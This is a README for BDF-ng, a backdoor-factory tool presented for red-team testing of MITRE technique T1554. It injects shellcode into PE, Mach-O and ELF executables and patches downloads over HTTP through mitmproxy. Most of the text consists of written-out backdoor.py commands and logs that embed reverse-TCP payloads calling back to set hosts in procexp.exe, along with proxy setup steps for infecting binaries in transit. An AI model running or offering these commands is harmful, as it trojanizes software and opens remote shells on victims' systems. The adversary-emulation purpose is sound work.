# BDF-ng-stable
# Alpha RELEASE 
BDF-ng Stable releases

For monthly updates see https://github.com/secretsquirrel/BDF-ng-stable/tree/master/status_updates



## What is BDF

BDF allows Blue/Purple/Red Teamers to test against Mitre's ATT&CK Framework, Technique T1554, Compromise Client Software Binary: https://attack.mitre.org/techniques/T1554/

In short:
* it's a stand alone file infector for macho, elf, and pe file formats. 

* It's also a mitmproxy add on. You can use it to patch executables over HTTP.

## Alpha

THIS IS Alpha

This supports:

* PE
  * x86
  * x64
* Mach-o 
  * x86
  * x64
  * M1
* ELF 
  * ET_EXEC 
  * ET_DYN
  * x86 
  * x64
  * ARMv7


## Install

For this to work, you'll need python 3.9+ 

Look at requirements.txt

You might need sudo, maybe not.
./install.zsh


## BDF Example:

```
./backdoor.py -f tests/procexp.exe PATCH_METHOD=jmp_at_entrypoint MODE=cave_jumping -Z PAYLOAD=iat_reverse_tcp_inline_threaded ENCODER=None -q MODIFIER=automatic PORT=8080 HOST=172.16.64.164 -q
2021-03-18 17:59:38,INFO,backdoor.py,
         BDF-ng
         
         Author:    Joshua Pitts
         Email:     the.midnite.runr[-at ]gmail<d o-t>com
         Twitter:   @ausernamedjosh
         
         Version:   5.0.0
         
2021-03-18 17:59:38,INFO,pe_parse.py,[*] Gathering file info
2021-03-18 17:59:38,INFO,core.py,[*] Setting patch_instr for overwriting certificate table pointer
2021-03-18 17:59:38,INFO,jmp_at_entrypoint.py,[*] Selected Payload: iat_reverse_tcp_inline_threaded
2021-03-18 17:59:38,INFO,jmp_at_entrypoint.py,[*] Selected Mode: cave_jumping
2021-03-18 17:59:38,INFO,core.py,[*] Checking for APIs
2021-03-18 17:59:38,INFO,core.py,[*] Parsing data directories
2021-03-18 17:59:38,INFO,core.py,[*] The APIs have been located in the file -- or created :D
2021-03-18 17:59:38,INFO,jmp_core.py,[*] Creating win32 resume execution stub
2021-03-18 17:59:38,INFO,core.py,[*] Looking for caves that will fit the minimum shellcode length of 71
2021-03-18 17:59:38,INFO,core.py,[*] All caves lengths: 71, 457, 87
2021-03-18 17:59:38,INFO,core.py,[*] Attempting PE File Automatic Patching
2021-03-18 17:59:38,INFO,core.py,    [!] Selected: 1282; Section Name: b'.rsrc\x00\x00\x00';     Cave begin: 0x11d51f;     End: 0x11d6ec;     Cave Size: 461;     Payload Size: 457
2021-03-18 17:59:38,INFO,core.py,    [!] Selected: 1046; Section Name: b'.rsrc\x00\x00\x00';     Cave begin: 0x258b3b;     End: 0x258b96;     Cave Size: 91;     Payload Size: 87
2021-03-18 17:59:38,INFO,core.py,    [!] Selected: 216; Section Name: b'.rsrc\x00\x00\x00';     Cave begin: 0x11a071;     End: 0x11a0bc;     Cave Size: 75;     Payload Size: 71
2021-03-18 17:59:38,INFO,core.py,[*] Changing flags for section: b'.rsrc\x00\x00\x00'
2021-03-18 17:59:38,INFO,jmp_core.py,[*] Creating win32 resume execution stub
2021-03-18 17:59:38,INFO,jmp_at_entrypoint.py,[*] Setting initial entry patch instructions
2021-03-18 17:59:38,INFO,support.py,[*] Patching file with patch_instr
2021-03-18 17:59:38,INFO,backdoor.py,[*] Patching successful!
2021-03-18 17:59:38,INFO,backdoor.py,[*] Output in backdoored/procexp.exe
```

text_loader example:
```
./backdoor.py -f tests/procexp64.exe PATCH_METHOD=jmp_at_entrypoint -q MODE=text_loader_single_cave PAYLOAD=text_loader_reverse_tcp_staged_threaded HOST=172.16.64.1 PORT=9090 ENCODER=None -o proxexp64_text.exe VERBOSE=False MODIFIER=manual
2022-01-31 21:59:37,INFO,backdoor.py,
         BDF-ng
         
         Author:    Joshua Pitts
         Email:     the.midnite.runr[-at ]gmail<d o-t>com
         Twitter:   @ausernamedjosh
         
         Version:   5.0.0
         
2022-01-31 21:59:37,INFO,pe_parse.py,[*] Gathering file info
2022-01-31 21:59:37,INFO,jmp_at_entrypoint.py,[*] Selected Payload: text_loader_reverse_tcp_staged_threaded
2022-01-31 21:59:37,INFO,jmp_at_entrypoint.py,[*] Selected Mode: text_loader_single_cave
2022-01-31 21:59:37,INFO,core.py,[*] Checking for APIs
2022-01-31 21:59:37,INFO,core.py,[*] Parsing data directories
2022-01-31 21:59:38,INFO,core.py,[*] The APIs have been located in the file -- or created :D
2022-01-31 21:59:38,INFO,jmp_core.py,[*] Reading win64 entry instructions
2022-01-31 21:59:38,INFO,jmp_core.py,[*] Creating win64 resume execution stub
2022-01-31 21:59:38,INFO,text_loader_single_cave.py,Loader len: 0x78, 120
2022-01-31 21:59:38,INFO,text_loader_single_cave.py,CreateThread stub len: 0x45, 69
2022-01-31 21:59:38,INFO,text_loader_single_cave.py,payload_stub len: 0x196, 406
2022-01-31 21:59:38,INFO,text_loader_single_cave.py,ResumeEXE stub len: 55
2022-01-31 21:59:38,INFO,text_loader_single_cave.py,slack_space_size: hex: 0xd0, 208
2022-01-31 21:59:38,INFO,text_loader_single_cave.py,txt_vrt_slck_loc: 5369603376, hex: 0x1400da530
2022-01-31 21:59:38,INFO,text_loader_single_cave.py,Text slack space is large enough
2022-01-31 21:59:38,INFO,core.py,[*] Looking for caves that will fit the minimum shellcode length of 530
2022-01-31 21:59:38,INFO,core.py,[*] All caves lengths: 530
2022-01-31 21:59:38,INFO,core.py,############################################################
The following caves can be used to inject code and possibly
continue execution.
**Don't like what you see? ignore or quit and view options.**
############################################################
[*] Cave 1 length as int: 530
[*] Available caves: 
1. Section Name: b'.data\x00\x00\x00'; Section Begin: 0x124000 End: 0x12e400; Cave begin: 0x128e89 End: 0x12909f;Cave Size: 534
2. Section Name: b'.rsrc\x00\x00\x00'; Section Begin: 0x136200 End: 0x168200; Cave begin: 0x14d824 End: 0x14da3a;Cave Size: 534
3. Section Name: b'.rsrc\x00\x00\x00'; Section Begin: 0x136200 End: 0x168200; Cave begin: 0x14fba3 End: 0x14fdb9;Cave Size: 534
4. Section Name: b'.rsrc\x00\x00\x00'; Section Begin: 0x136200 End: 0x168200; Cave begin: 0x150a3b End: 0x150c51;Cave Size: 534
5. Section Name: b'.rsrc\x00\x00\x00'; Section Begin: 0x136200 End: 0x168200; Cave begin: 0x150ee3 End: 0x1510f9;Cave Size: 534
6. Section Name: b'.rsrc\x00\x00\x00'; Section Begin: 0x136200 End: 0x168200; Cave begin: 0x1510fd End: 0x151313;Cave Size: 534
7. Section Name: b'.rsrc\x00\x00\x00'; Section Begin: 0x136200 End: 0x168200; Cave begin: 0x152b7c End: 0x152d92;Cave Size: 534
8. Section Name: b'.rsrc\x00\x00\x00'; Section Begin: 0x136200 End: 0x168200; Cave begin: 0x152d96 End: 0x152fac;Cave Size: 534
9. Section Name: b'.rsrc\x00\x00\x00'; Section Begin: 0x136200 End: 0x168200; Cave begin: 0x152fb0 End: 0x1531c6;Cave Size: 534
10. Section Name: b'.rsrc\x00\x00\x00'; Section Begin: 0x136200 End: 0x168200; Cave begin: 0x15348b End: 0x1536a1;Cave Size: 534
11. Section Name: b'.rsrc\x00\x00\x00'; Section Begin: 0x136200 End: 0x168200; Cave begin: 0x1541a4 End: 0x1543ba;Cave Size: 534
**************************************************
[!] Enter your selection: 11
[!] Using selection: 11
2022-01-31 21:59:41,INFO,jmp_core.py,[*] Creating win64 resume execution stub
2022-01-31 21:59:41,INFO,jmp_at_entrypoint.py,[*] Setting initial entry patch instructions
2022-01-31 21:59:41,INFO,support.py,[*] Patching file with patch_instr
2022-01-31 21:59:41,INFO,backdoor.py,[*] Patching successful!
2022-01-31 21:59:41,INFO,backdoor.py,[*] Output in backdoored/proxexp64_text.exe
```

## BDFProxy example:

```
Edit the proxy.cfg to your liking

In terminal one: 
$ touch bdf.log
$ tail -f bdf.log 

Terminal two:
$ mitmproxy -s ./backdoor.py

Set your proxy to port 8080

```


## Known Issues:

- Make a metasploit RC output
- A proper "how to"

# Future Work
* Examples:
  * Rest API
  * Hash collisions
  * Drivers
  * and more...

